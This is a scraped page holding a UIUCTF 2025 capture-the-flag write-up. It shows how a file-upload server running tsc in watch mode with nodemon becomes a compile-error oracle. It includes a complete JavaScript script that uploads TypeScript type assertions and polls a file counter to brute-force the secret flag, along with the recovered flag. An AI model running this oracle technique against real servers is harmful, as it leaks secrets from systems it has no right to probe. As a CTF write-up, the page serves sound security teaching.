<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class=""></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class=""> </span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">    </span><span class="token keyword control-flow">while</span><span class=""> </span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">        </span><span class="token keyword control-flow">for</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword">const</span><span class=""> char </span><span class="token keyword">of</span><span class=""> charset</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">            </span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">            </span><span class="token keyword">const</span><span class=""> valid </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">bruteOnce</span><span class="token punctuation">(</span><span class="">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">            </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">valid</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword control-flow">continue</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">            flag </span><span class="token operator">+=</span><span class=""> char</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">            </span><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token string">&#x27;flag:&#x27;</span><span class="token punctuation">,</span><span class=""> flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">            </span><span class="token keyword control-flow">break</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">56</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">flag</span><span class="token punctuation">.</span><span class="token method function property-access">at</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">===</span><span class=""> </span><span class="token string">&#x27;}&#x27;</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword control-flow">break</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">59</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div>
<p>Running the script for a few minutes, we get the flag.</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">uiuctf{turing_complete_azolwkamgj}</span></code></pre></div></div></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-d11e0b30904b49ad.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-3e820bd666038662.js\",\"633\",\"static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js\"],\"\"]\n6:I[59665,[],\"OutletBoundary\"]\n8:I[74911,[],\"AsyncMetadataOutlet\"]\na:I[59665,[],\"ViewportBoundary\"]\nc:I[59665,[],\"MetadataBoundary\"]\nd:\"$Sreact.suspense\"\nf:I[28393,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/94afdc017676131d.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"jUDimr6wyOJvYNMJ2n6_v\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"8096bd32165fc11285468e3ee1a3997c\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"8096bd32165fc11285468e3ee1a3997c\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/94afdc017676131d.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"id\",\"8096bd32165fc11285468e3ee1a3997c\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",null,[\"$\",\"$L6\",null,{\"children\":[\"$L7\",[\"$\",\"$L8\",null,{\"promise\":\"$@9\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$Lc\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$d\",null,{\"fallback\":null,\"children\":\"$Le\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n7:null\n"])</script><script>self.__next_f.push([1,"10:I[50674,[\"325\",\"static/chunks/325-655a7b8ed93161e0.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-bcc47f65bcf2ff4c.js\"],\"default\"]\n11:T6ad,"])</script><script>self.__next_f.push([1,"import express from \"express\";\nimport path from \"path\";\nimport multer from \"multer\";\nimport fs from \"fs\";\n\nconst app = express();\nconst PORT = process.env.PORT || 3000;\n\nlet fileCount = 0;\n\napp.get(\"/\", (req, res) =\u003e {\n  res.sendFile(path.join(__dirname, \"../public/index.html\")); // paths are relative to dist/\n});\n\nconst imagesDir = path.join(__dirname, \"../images\");\nif (!fs.existsSync(imagesDir)) {\n  fs.mkdirSync(imagesDir, { recursive: true });\n}\n\nconst storage = multer.diskStorage({\n  destination: function (req, file, cb) {\n    cb(null, imagesDir);\n  },\n  filename: function (req, file, cb) {\n    cb(null, path.basename(file.originalname));\n  },\n});\n\nconst upload = multer({ storage });\n\napp.get(\"/filecount\", (req, res) =\u003e {\n  res.json({ file_count: fileCount });\n});\n\napp.post(\"/upload\", upload.single(\"file\"), (req, res) =\u003e {\n  if (!req.file) {\n    return res.status(400).send(\"No file uploaded.\");\n  }\n  fileCount++;\n  res.send(\"File uploaded successfully.\");\n});\n\napp.delete(\"/images\", (req, res) =\u003e {\n  const imagesDir = path.join(__dirname, \"../images\");\n  fs.readdir(imagesDir, (err, files) =\u003e {\n    if (err) {\n      return res.status(500).send(\"Failed to read images directory.\");\n    }\n    let deletePromises = files.map((file) =\u003e\n      fs.promises.unlink(path.join(imagesDir, file))\n    );\n    Promise.allSettled(deletePromises)\n      .then(() =\u003e {\n        fileCount = 0;\n        res.send(\"All files deleted from images directory.\");\n      })\n      .catch(() =\u003e res.status(500).send(\"Failed to delete some files.\"));\n  });\n});\n\napp.listen(PORT, () =\u003e {\n  return console.log(`Express is listening at http://localhost:${PORT}`);\n});\n\nexport const flag = \"uiuctf{fake_flag_xxxxxxxxxxxxxxxx}\";"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"UIUCTF 2025 — Upload, Upload, and Away!\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Keeping track of all these files makes me so dizzy I feel like I'm floating in space.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"Instancer url: \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://upload-upload-and-away.chal.uiuc.tf/\",\"children\":\"https://upload-upload-and-away.chal.uiuc.tf/\"}]]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"Flag format: uiuctf{[a-z_]+}\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a TypeScript server that looks like this:\"}],\"\\n\",[\"$\",\"$L10\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$11\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"The express app exposes a few routes that let us upload files to the \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"../images\"}],\" directory on the server, as well as query the \\\"file count\\\" tracking the number of files that have been uploaded.\"]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":[\"Curiously, looking in the project \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"package.json\"}],\",\"]}],\"\\n\",[\"$\",\"$L10\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"{\\n  \\\"name\\\": \\\"tschal\\\",\\n  \\\"version\\\": \\\"1.0.0\\\",\\n  \\\"scripts\\\": {\\n    \\\"start\\\": \\\"concurrently \\\\\\\"tsc -w\\\\\\\" \\\\\\\"nodemon dist/index.js\\\\\\\"\\\"\\n  },\\n  \\\"keywords\\\": [\\n    \\\"i miss bun, if only there was an easier way to use typescript and nodejs :)\\\"\\n  ],\\n  \\\"author\\\": \\\"\\\",\\n  \\\"license\\\": \\\"ISC\\\",\\n  \\\"description\\\": \\\"\\\",\\n  \\\"devDependencies\\\": {\\n    \\\"@types/express\\\": \\\"^5.0.3\\\",\\n    \\\"@types/multer\\\": \\\"^2.0.0\\\",\\n    \\\"concurrently\\\": \\\"^9.2.0\\\",\\n    \\\"nodemon\\\": \\\"^3.1.10\\\",\\n    \\\"typescript\\\": \\\"^5.8.3\\\"\\n  },\\n  \\\"dependencies\\\": {\\n    \\\"express\\\": \\\"^5.1.0\\\",\\n    \\\"multer\\\": \\\"^2.0.2\\\"\\n  }\\n}\",\"language\":\"json\"}],\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\"]}]}]\n"])</script><script>self.__next_f.push([1,"12:[\"$\",\"p\",\"p-3\",{\"children\":[\"the server uses \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.npmjs.com/package/concurrently\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"concurrently\"}]}],\" to run \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"tsc -w\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nodemon dist/index.js\"}],\" simultaneously. The key observation is this:\"]}]\n"])</script><script>self.__next_f.push([1,"13:[\"$\",\"ul\",\"ul-0\",{\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"tsc -w\"}],\" runs the TypeScript compiler in \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.typescriptlang.org/docs/handbook/compiler-options.html\",\"children\":\"watch mode\"}],\", telling it to automatically recompile the project when source files have changed.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nodemon\"}],\" will \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.npmjs.com/package/nodemon\",\"children\":\"restart the server\"}],\" when a \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\".js\"}],\" file has changed.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":\"Since the file count is just a local variable, when the server restarts it will be reset to 0.\"}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"14:[\"$\",\"p\",\"p-4\",{\"children\":[\"The above combine to give us a TypeScript error oracle: uploading TypeScript files to the server will trigger \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"tsc\"}],\" to recompile the project. If the compilation succeeds, new \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\".js\"}],\" files will be generated that will trigger \",[\"$\",\"code\",\"code-2\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nodemon\"}],\" to restart the server and reset the file count; otherwise, the file count will be incremented as normal. Querying the file count, therefore, lets us check whether arbitrary TypeScript code compiles on the server.\"]}]\n"])</script><script>self.__next_f.push([1,"15:[\"$\",\"p\",\"p-5\",{\"children\":\"Indeed, we can test with simple TS files that both fails to and succeed in compiling. Uploading a TypeScript file that fails to compile, we get\"}]\n16:[\"$\",\"$L10\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"import { flag }  from '../index';\\n\\nexport const x: number = flag;\",\"language\":\"ts\"}]\n17:[\"$\",\"$L10\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"5:47:53 PM - File change detected. Starting incremental compilation...\\n[0]\\n[0] images/test.ts(3,14): error TS2322: Type 'string' is not assignable to type 'number'.\\n[0]\\n[0] 5:47:53 PM - Found 1 error. Watching for file changes.\",\"language\":\"bash\"}]\n18:[\"$\",\"p\",\"p-6\",{\"children\":\"but using a file that successfully compiles, we instead get\"}]\n19:[\"$\",\"$L10\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"import { flag }  from '../index';\\n\\nexport const x: string = flag;\",\"language\":\"ts\"}]\n1a:[\"$\",\"$L10\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"5:44:58 PM - File change detected. Starting incremental compilation...\\n[0]\\n[0]\\n[0] 5:44:59 PM - Found 0 errors. Watching for file changes.\\n[1] [nodemon] restarting due to changes...\\n[1] [nodemon] starting `node dist/index.js`\\n[1] Express is listening at http://localhost:3000\",\"language\":\"bash\"}]\n1b:[\"$\",\"p\",\"p-7\",{\"children\":\"and our file count is reset to 0.\"}]\n"])</script><script>self.__next_f.push([1,"1c:[\"$\",\"p\",\"p-8\",{\"children\":[\"We can use this error oracle to leak the flag with a technique reminiscent of \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://kevin.fish/writeups/a851fdabc90d887a61af81c071f6f0ce\",\"children\":\"BuckeyeCTF 2023\"}],\": since the flag is exported from \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"index.ts\"}],\" as a \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"const\"}],\" variable, we can use \",[\"$\",\"a\",\"a-1\",{\"href\":\"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html\",\"children\":\"template literal types\"}],\" to assert against substrings of the flag.\"]}]\n"])</script><script>self.__next_f.push([1,"1d:[\"$\",\"p\",\"p-9\",{\"children\":[\"Concretely, for those not familiar with this technique, if the flag exported by \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"index.ts\"}],\" was\"]}]\n1e:[\"$\",\"$L10\",\"pre-6\",{\"className\":\"my-2\",\"children\":\"export const flag = 'uiuctf{test_flag}'  // flag: \\\"uiuctf{test_flag}\\\"\",\"language\":\"ts\"}]\n1f:[\"$\",\"p\",\"p-10\",{\"children\":[\"then the first assignment would successfully type check, while the second fails (since the first character of the \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"flag\"}],\" string is not \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"a\"}],\"):\"]}]\n20:[\"$\",\"$L10\",\"pre-7\",{\"className\":\"my-2\",\"children\":\"const foo: `u${string}` = flag;\",\"language\":\"ts\"}]\n21:[\"$\",\"$L10\",\"pre-8\",{\"className\":\"my-2\",\"children\":\"const foo: `a${string}` = flag;  // Type '\\\"uiuctf{test_flag}\\\"' is not assignable to type '`a${string}`'.\",\"language\":\"ts\"}]\n22:[\"$\",\"p\",\"p-11\",{\"children\":\"Thus, we just need to use template literals to brute force the flag character by character, checking the file count each time to determine if the character was correct. Here's a simple script that does just that:\"}]\n26:T5b2,"])</script><script>self.__next_f.push([1,"const BASE_URL = 'https://inst-ff5e88fd8f55fd4e-upload-upload-and-away.chal.uiuc.tf/';\n\nfunction sleep(ms) {\n    return new Promise((resolve) =\u003e setTimeout(resolve, ms));\n}\n\nasync function getFileCount() {\n    const { file_count } = await (await fetch(`${BASE_URL}/filecount`)).json();\n    return file_count;\n}\n\nasync function deleteImages() {\n    await fetch(`${BASE_URL}/images`, {\n        method: 'DELETE'\n    });\n}\n\nasync function uploadCode(code) {\n    const data = new FormData();\n    data.append('file', new Blob([code], { type: 'text/plain' }), 'test.ts');\n\n    const res = await (await fetch(`${BASE_URL}/upload`, {\n        method: 'POST',\n        body: data\n    })).text()\n\n    // console.log(res);\n}\n\nconst charset = 'abcdefghijklmnopqrstuvwxyz_}'\nlet flag = 'uiuctf{'\n\nasync function bruteOnce(char) {\n    await deleteImages();\n    await uploadCode(`import { flag } from '../index'; export const x: \\`${flag}${char}\\$\\{string\\}\\` = flag;`);\n\n    // Sleep so that the server has time to restart if the type check passes\n    await sleep(1500);\n    const count = await getFileCount();\n\n    return count === 0;\n}\n\n;(async () =\u003e {\n    while (true) {\n        for (const char of charset) {\n            console.log(char);\n            const valid = await bruteOnce(char);\n\n            if (!valid) continue;\n\n            flag += char;\n            console.log('flag:', flag);\n            break;\n        }\n\n        if (flag.at(-1) === '}') break;\n    }\n})();"])</script><script>self.__next_f.push([1,"23:[\"$\",\"$L10\",\"pre-9\",{\"className\":\"my-2\",\"children\":\"$26\",\"language\":\"js\"}]\n24:[\"$\",\"p\",\"p-12\",{\"children\":\"Running the script for a few minutes, we get the flag.\"}]\n25:[\"$\",\"$L10\",\"pre-10\",{\"className\":\"my-2\",\"children\":\"uiuctf{turing_complete_azolwkamgj}\",\"language\":\"$undefined\"}]\n"])</script><script>self.__next_f.push([1,"9:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"UIUCTF 2025 — Upload, Upload, and Away! | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Keeping track of all these files makes me so dizzy I feel like I'm floating in space.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"UIUCTF 2025 — Upload, Upload, and Away!\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"Keeping track of all these files makes me so dizzy I feel like I'm floating in space.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"UIUCTF 2025 — Upload, Upload, and Away!\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"Keeping track of all these files makes me so dizzy I feel like I'm floating in space.\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"e:\"$9:metadata\"\n"])</script></body></html>